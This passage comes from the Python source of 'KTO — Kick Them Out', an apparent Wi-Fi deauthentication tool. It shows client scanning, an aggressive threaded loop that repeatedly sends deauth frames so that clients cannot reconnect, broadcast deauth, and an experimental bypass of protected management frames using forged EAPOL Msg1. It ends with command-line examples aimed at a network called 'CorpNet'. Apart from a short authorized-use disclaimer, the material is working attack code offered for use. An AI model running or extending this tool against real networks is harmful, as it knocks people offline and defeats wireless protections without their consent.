                if mac in self.whitelist:
                    warn(f"Whitelisted : {mac}{tag}")
                else:
                    info(f"New client  : {C.BOLD}{mac}{C.RESET}{tag}")

            for mac in gone:
                if mac not in self.whitelist:
                    info(f"Left        : {C.DIM}{mac}{C.RESET}{vendor_tag(mac)}")

            if not found:
                warn("No clients found this sweep.")
            else:
                info(f"Active clients: {len(found)}")

            # In non-aggressive mode, deauth happens here sequentially
            if not self.aggressive and not self.scan_only:
                with self._clients_lock:
                    targets = set(self._clients)
                for mac in targets:
                    if mac not in self.whitelist and self._running.is_set():
                        self._deauth(mac)

            # Interruptible sleep before next sweep
            deadline = time.monotonic() + self.interval
            while time.monotonic() < deadline and self._running.is_set():
                time.sleep(0.25)

    # ── Deauth thread (aggressive only) ──────────────────────────────────────

    def _deauth_loop(self):
        """Hammer known clients continuously, independent of scan timing."""
        while self._running.is_set():
            with self._clients_lock:
                targets = set(self._clients)

            if not targets:
                time.sleep(0.5)
                continue

            for mac in targets:
                if not self._running.is_set():
                    break
                if mac not in self.whitelist:
                    self._deauth(mac)
                    # configurable per-client delay prevents
                    # the loop from becoming a tight busy-spin when there
                    # are few clients and also gives the NIC breathing room
                    if self.deauth_delay > 0:
                        time.sleep(self.deauth_delay)

    # ── Live table ───────────────────────────────────────────────────────────

    def _table_loop(self):
        # refreshes every 2 s — only active when --live-table is set
        while self._running.is_set():
            time.sleep(2)
            with self._stats_lock:
                stats = dict(self._stats)
            if not stats:
                continue
            os.system("clear")
            if self.ap_key_info is not None:
                pmf_status = f"{C.CYAN}[PMF Bypass: Msg1 armed]{C.RESET}"
            elif self.passive_bypass:
                pmf_status = f"{C.YELLOW}[PMF Passive: waiting for Msg1…]{C.RESET}"
            else:
                pmf_status = ""
            print(f"\n{C.BOLD}{C.RED}  KTO — {self.ssid}{C.RESET}  {C.DIM}{datetime.now().strftime('%H:%M:%S')}{C.RESET}  {pmf_status}\n")
            print(f"  {C.DIM}{'MAC':<20} {'Vendor':<16} {'Kicks':>5}{C.RESET}")
            print(f"  {C.DIM}{'─'*45}{C.RESET}")
            for mac, n in sorted(stats.items(), key=lambda x: -x[1]):
                vendor = oui_vendor(mac) or "—"
                print(f"  {C.BOLD}{mac:<20}{C.RESET} {C.DIM}{vendor:<16}{C.RESET} {C.RED}{n:>5}{C.RESET}")
            print()

    # ── Entry point ──────────────────────────────────────────────────────────

    def run(self):
        check_root()
        check_dependency("airodump-ng")
        if self.use_aireplay:
            check_dependency("aireplay-ng")
        if self.auto_monitor:
            check_dependency("airmon-ng")
            self.interface  = enable_monitor_mode(self.interface)
            self._mon_created = True
            conf.iface      = self.interface

        # Add our own interface MAC to the whitelist so we never kick ourselves
        my_mac = get_iface_mac(self.interface)
        if my_mac:
            self.whitelist.add(my_mac)
            info(f"Self MAC {C.BOLD}{my_mac}{C.RESET} automatically whitelisted")

        art = (
            "⠀⠀⠀⢀⣤⣶⣿⣿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣠⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⠿⠋⠀⣚⣫⣭⣶⣮⡝⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⢀⣴⣿⣿⠿⠿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣭⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⠇⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⣰⣿⣿⡟⣱⣿⣿⣦⡙⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣛⣥⣾⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀\n"
            "⠀⣰⣿⣿⣿⣧⢻⣿⣿⣿⣿⣌⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢛⣛⣭⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀\n"
            "⢠⣿⣿⣿⣿⣿⣎⢿⣿⣿⣿⣿⣷⣥⣀⣀⣀⣀⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⠙⣛⣛⣛⣋⣭⣭⣥⣶⣶⡿⠿⠟⠛⠋⠉⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀\n"
            "⣼⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀\n"
            "⣿⣿⣿⣿⠹⣿⣿⣿⣿⣶⣭⣙⡻⠿⠿⠿⠿⠿⠿⠿⠿⠛⠁⠀⠀⠀⠀⣀⣀⣤⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆\n"
            "⣿⣿⣿⣿⡀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n"
            "⢹⣿⣿⣿⣧⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇\n"
            "⠈⢿⣿⣿⣿⠆⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠛⠛⠛⠉⠉⠉⠉⠉⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠃⠀\n"
            "⠀⠈⠛⠛⠋⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠉⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
            "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
        )
        print(f"\033[31m{art}{C.RESET}")
        print(f"\n{C.BOLD}{C.RED}  KTO — Kick Them Out  v{VERSION}{C.RESET}\n")
        info(f"Interface  : {self.interface}")
        info(f"Target SSID: {self.ssid}")
        if self.scan_only:
            info(f"Mode       : {C.YELLOW}SCAN ONLY{C.RESET} (passive, no deauth)")
        else:
            engine = "aireplay-ng" if self.use_aireplay else "scapy 802.11"
            agr    = f"  {C.YELLOW}[AGGRESSIVE — threaded]{C.RESET}" if self.aggressive else ""
            info(f"Deauth     : {engine}{agr}")
            info(f"Burst      : {self.deauth_count} frames / direction  (reason {self.reason})")
        if self.whitelist:
            info(f"Whitelist  : {', '.join(self.whitelist)}")
        info(f"Scan dur.  : {self.scan_duration} s   Sweep interval: {self.interval} s")
        if self._log_fh:
            info(f"Log file   : {self._log_fh.name}")
        print()

        if not self.find_target():
            self._cleanup()
            sys.exit(1)

        # PMF bypass for WPA2+PMF only
        if self.pmf_bypass:
            info("Attempting wrong‑password EAPOL extraction…")
            if self._perform_wrong_pass_eapol_extract():
                good("PMF bypass active — fake Msg1 will be used.")
            else:
                warn("Wrong‑password extraction failed. Falling back to passive sniff.")
                self.passive_bypass = True
                threading.Thread(
                    target=self._sniff_eapol_passively,
                    daemon=True,
                    name="eapol_sniff",
                ).start()

        if self.target_channel:
            set_channel(self.interface, self.target_channel)

        info("Running. Ctrl+C to stop.\n")

        scan_t = threading.Thread(target=self._scan_loop, daemon=True, name="scan")
        scan_t.start()

        if self.live_table:
            threading.Thread(target=self._table_loop, daemon=True, name="table").start()

        if self.aggressive and not self.scan_only:
            deauth_t = threading.Thread(target=self._deauth_loop, daemon=True, name="deauth")
            deauth_t.start()

        scan_t.join()


# ── CLI ─────────────────────────────────────────────────────────────────────

def load_whitelist(flag_value: str | None, file_path: str | None) -> set[str]:
    macs: set[str] = set()

    if flag_value:
        for raw in flag_value.split(","):
            mac = normalize_mac(raw.strip())
            if validate_mac(mac):
                macs.add(mac)
            elif raw.strip():
                warn(f"Invalid MAC in --whitelist (skipped): {raw.strip()}")

    if file_path:
        p = Path(file_path)
        if not p.exists():
            bad(f"Whitelist file not found: {file_path}")
            sys.exit(1)
        for line in p.read_text().splitlines():
            mac = normalize_mac(line.strip())
            if validate_mac(mac):
                macs.add(mac)
            elif line.strip() and not line.strip().startswith("#"):
                warn(f"Invalid line in whitelist file (skipped): {line.strip()}")

    return macs


def main():
    parser = argparse.ArgumentParser(
        description=f"KTO v{VERSION} — Kick Them Out: WiFi deauth tool for authorized pen-testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  sudo python3 kto.py -i wlan0mon -t "CorpNet"
  sudo python3 kto.py -i wlan0    -t "CorpNet" --auto-monitor
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --aggressive
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --scan-only
  sudo python3 kto.py -i wlan0mon -t "CorpNet" -w AA:BB:CC:DD:EE:FF
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --whitelist-file safe.txt
  sudo python3 kto.py -i wlan0mon -t "CorpNet" -n 10 --aireplay --broadcast
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --scan-duration 12 --delay 0.2
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --auto-bssid   # mesh / multi-AP
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --reason 1     # 1=unspecified
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --log kicks.txt
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --live-table
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --no-bypass    # disable PMF bypass

disclaimer:
  Only use on networks you own or have explicit written permission to test.
  Unauthorized deauthentication attacks are illegal in most jurisdictions.
        """,
    )

    parser.add_argument("-i", "--interface",    required=True,
                        help="Wireless interface (monitor mode, or combine with --auto-monitor)")
    parser.add_argument("-t", "--target",       required=True,
                        help="Target WiFi SSID")
    parser.add_argument("-w", "--whitelist",    default=None,
                        help="Comma-separated MACs to spare from deauth")
    parser.add_argument("--whitelist-file",     default=None, metavar="FILE",
                        help="File of MACs to spare, one per line (# = comment)")
    parser.add_argument("-c", "--channel",      type=int, default=None,
                        help="Force a specific channel (skips auto-detect)")
    parser.add_argument("-n", "--count",        type=int, default=5,
                        help="Deauth frames per burst per direction (default: 5)")
    parser.add_argument("-s", "--sleep",        type=float, default=5.0,
                        help="Seconds between client sweeps (default: 5)")
    # configurable scan window
    parser.add_argument("--scan-duration",      type=float, default=8.0,
                        help="Seconds airodump-ng listens per sweep (default: 8)")
    # per-client delay in aggressive mode
    parser.add_argument("--delay",              type=float, default=0.1,
                        help="Seconds between clients in aggressive deauth loop (default: 0.1)")
    parser.add_argument("--broadcast",          action="store_true",
                        help="Also blast ff:ff:ff:ff:ff:ff deauth")
    parser.add_argument("--aireplay",           action="store_true",
                        help="Use aireplay-ng instead of Scapy for deauth")
    parser.add_argument("--aggressive",         action="store_true",
                        help="Threaded mode: deauth runs in parallel with scanning "
                             "so clients get no reconnect window")
    parser.add_argument("--scan-only",          action="store_true",
                        help="Passive mode — discover and log clients, no deauth")
    parser.add_argument("--auto-monitor",       action="store_true",
                        help="Auto enable monitor mode via airmon-ng (pass base iface e.g. wlan0)")
    # mesh / multi-AP SSID handling
    parser.add_argument("--auto-bssid",         action="store_true",
                        help="Auto-select strongest AP when SSID spans multiple BSSIDs (mesh/roaming)")
    # deauth reason code
    parser.add_argument("--reason",             type=int, default=7,
                        help="802.11 deauth reason code (default: 7 = class-3-frame). "
                             "Common: 1=unspecified, 4=inactivity, 7=class3-frame")
    parser.add_argument("--log",                default=None, metavar="FILE",
                        help="Save a timestamped kick log to a file (appends across sessions)")
    parser.add_argument("--live-table",         action="store_true",
                        help="Show a live client table instead of scrolling log (clears screen every 2 s)")
    parser.add_argument("--no-bypass", "-nb",   action="store_true",
                        help="Disable experimental PMF bypass (use normal deauths even on WPA2+PMF)")

    args = parser.parse_args()

    # check for updates in the background, never blocks
    threading.Thread(target=_check_update, daemon=True).start()

    KTO(
        interface     = args.interface,
        ssid          = args.target,
        whitelist     = load_whitelist(args.whitelist, args.whitelist_file),
        channel       = args.channel,
        deauth_count  = args.count,
        interval      = args.sleep,
        scan_duration = args.scan_duration,
        deauth_delay  = args.delay,
        broadcast     = args.broadcast,
        use_aireplay  = args.aireplay,
        aggressive    = args.aggressive,
        scan_only     = args.scan_only,
        auto_monitor  = args.auto_monitor,
        auto_bssid    = args.auto_bssid,
        reason        = args.reason,
        log_file      = args.log,
        live_table    = args.live_table,
        no_bypass     = args.no_bypass,
    ).run()


if __name__ == "__main__":
    main()
